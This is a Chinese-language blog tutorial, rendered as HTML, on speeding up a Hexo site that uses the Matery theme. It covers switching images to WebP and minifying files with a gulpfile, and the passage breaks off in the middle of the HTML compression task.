<h3 id="优化网站加载速度"><a href="#优化网站加载速度" class="headerlink" title="**优化网站加载速度"></a>**优化网站加载速度</h3><h4 id="1-修改轮播图图片格式为Webp"><a href="#1-修改轮播图图片格式为Webp" class="headerlink" title="1.修改轮播图图片格式为Webp"></a>1.修改轮播图图片格式为Webp</h4><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。默认的图片格式为<code>Jpg</code>，为了加快网站加载速度，可以将<code>jpg</code>格式修改为<code>webp</code>从而加快网站加载。</p>
<p>在<code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中进行以下修改：</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//修改前</span>
<span class="token keyword">var</span> bannerUrl <span class="token operator">=</span> <span class="token string">"&lt;%- theme.jsDelivr.url %>&lt;%- url_for('/medias/banner/') %>"</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg'</span><span class="token punctuation">;</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//修改后</span>
<span class="token keyword">var</span> bannerUrl <span class="token operator">=</span> <span class="token string">"&lt;%- theme.jsDelivr.url %>&lt;%- url_for('/medias/banner/') %>"</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.webp'</span><span class="token punctuation">;</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.webp)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p>
<hr>
<h4 id="2-修改文章封面图片格式为Webp"><a href="#2-修改文章封面图片格式为Webp" class="headerlink" title="2.修改文章封面图片格式为Webp"></a>2.修改文章封面图片格式为Webp</h4><p>打开主题配置文件<code>themes\hexo-theme-matery\_config.yml</code>中的<code>_config.yml</code>文件，之后在文本编辑器内搜索<code>featureimages</code>，将图片后缀的<code>jpg</code>文件替换成<code>Webp</code>即可!</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" alt="在VSC中修改封面图片格式"></p>
<p><strong>在VSC中修改封面图片格式</strong></p>
<h4 id="3-Gulp实现代码压缩"><a href="#3-Gulp实现代码压缩" class="headerlink" title="3.Gulp实现代码压缩"></a>3.Gulp实现代码压缩</h4><hr>
<p><code>Gulp</code>实现代码压缩，以提升网页加载速度。</p>
<p>1 首先我们需要安装Gulp插件和5个功能模块，依次运行下面的两条命令。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> gulp -g  <span class="token comment" spellcheck="true">#安装gulp</span>
<span class="token comment" spellcheck="true"># 安装功能模块</span>
<span class="token function">npm</span> <span class="token function">install</span> gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save
<span class="token comment" spellcheck="true"># 额外的功能模块</span>
<span class="token function">npm</span> <span class="token function">install</span> gulp-debug gulp-clean-css gulp-changed gulp-if gulp-plumber gulp-babel babel-preset-es2015 del --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2 接下来在博客的根目录下新建gulpfile.js文件，并复制下面的内容到文件中。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> gulp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> debug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-debug"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> cleancss <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-clean-css"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//css压缩组件</span>
<span class="token keyword">var</span> uglify <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-uglify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//js压缩组件</span>
<span class="token keyword">var</span> htmlmin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlmin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html压缩组件</span>
<span class="token keyword">var</span> htmlclean <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlclean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html清理组件</span>
<span class="token keyword">var</span> imagemin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-imagemin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//图片压缩组件</span>
<span class="token keyword">var</span> changed <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-changed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件更改校验组件</span>
<span class="token keyword">var</span> gulpif <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-if"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//任务 帮助调用组件</span>
<span class="token keyword">var</span> plumber <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-plumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//容错组件（发生错误不跳出任务，并报出错误内容）</span>
<span class="token keyword">var</span> isScriptAll <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否处理所有文件，(true|处理所有文件)(false|只处理有更改的文件)</span>
<span class="token keyword">var</span> isDebug <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否调试显示 编译通过的文件</span>
<span class="token keyword">var</span> gulpBabel <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-babel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> es2015Preset <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"babel-preset-es2015"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> del <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> Hexo <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"hexo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> hexo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hexo</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化一个hexo对象</span>

<span class="token comment" spellcheck="true">// 清除public文件夹</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"clean"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"public/**/*"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 下面几个跟hexo有关的操作，主要通过hexo.call()去执行，注意return</span>
<span class="token comment" spellcheck="true">// 创建静态页面 （等同 hexo generate）</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> hexo
      <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        watch<span class="token punctuation">:</span> <span class="token boolean">false</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 启动Hexo服务器</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> hexo
    <span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 部署到服务器</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> hexo
      <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        watch<span class="token punctuation">:</span> <span class="token boolean">false</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 压缩public目录下的js文件</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressJs"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> gulp
    <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.js"</span><span class="token punctuation">,</span> <span class="token string">"!./public/libs/**"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span>排除的js
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress JS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>
      <span class="token function">gulpBabel</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        presets<span class="token punctuation">:</span> <span class="token punctuation">[</span>es2015Preset<span class="token punctuation">]</span> <span class="token operator">/</span><span class="token operator">/</span> es5检查机制
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span><span class="token function">调用压缩组件方法uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>对合并的文件进行压缩
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>输出到目标目录
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">/</span><span class="token operator">/</span> 压缩<span class="token keyword">public</span>目录下的css文件
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>
    rebase<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token operator">/</span><span class="token operator">/</span>advanced<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>               <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">true</span> <span class="token punctuation">[</span>是否开启高级优化（合并选择器等）<span class="token punctuation">]</span>
    compatibility<span class="token punctuation">:</span> <span class="token string">"ie7"</span> <span class="token operator">/</span><span class="token operator">/</span>保留ie7及以下兼容写法 类型：String 默认：<span class="token string">''</span>or<span class="token string">'*'</span> <span class="token punctuation">[</span>启用兼容模式； <span class="token string">'ie7'</span>：IE7兼容模式，<span class="token string">'ie8'</span>：IE8兼容模式，<span class="token string">'*'</span>：IE9<span class="token operator">+</span>兼容模式<span class="token punctuation">]</span>
    <span class="token operator">/</span><span class="token operator">/</span>keepBreaks<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>             <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">false</span> <span class="token punctuation">[</span>是否保留换行<span class="token punctuation">]</span>
    <span class="token operator">/</span><span class="token operator">/</span>keepSpecialComments<span class="token punctuation">:</span> <span class="token string">'*'</span>      <span class="token operator">/</span><span class="token operator">/</span>保留所有特殊前缀 当你用autoprefixer生成的浏览器前缀，如果不加这个参数，有可能将会删除你的部分前缀
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> gulp
    <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.css"</span><span class="token punctuation">,</span> <span class="token string">"!./public/**/*.min.css"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//排除的css</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress CSS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">cleancss</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 压缩public目录下的html文件</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cleanOptions <span class="token operator">=</span> <span class="token punctuation">{</span>
    protect<span class="token punctuation">:</span> <span class="token regex">/&lt;\!--%fooTemplate\b.*?%-->/g</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//忽略处理</span>
    unprotect<span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">&lt;</span>script <span class="token punctuation">[</span><span class="token operator">^</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">*</span>\btype<span class="token operator">=</span><span class="token string">"text\/x-handlebars-template"</span><span class="token punctuation">[</span>\s\S<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">?</span><span class="token operator">&lt;</span>\<span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">/</span>gi <span class="token comment" spellcheck="true">//特殊处理</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> minOption <span class="token operator">=</span> <span class="token punctuation">{</span>
    collapseWhitespace<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩HTML</span>
    collapseBooleanAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//省略布尔属性的值  &lt;input checked="true"/> ==> &lt;input /></span>
    removeEmptyAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除所有空格作属性值    &lt;input id="" /> ==> &lt;input /></span>
    removeScriptTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;script>的type="text/javascript"</span>
    removeStyleLinkTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;style>和&lt;link>的type="text/css"</span>
    removeComments<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//清除HTML注释</span>
    minifyJS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面JS</span>
    minifyCSS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面CSS</span>
    minifyURLs<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">//替换页面URL</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> gulp
    <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/**/*.html"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress HTML:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlclean</span><span class="token punctuation">(</span>cleanOptions<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlmin</span><span class="token punctuation">(</span>minOption<span class="token punctuation">)</span><span class="token punctuation">)</span>
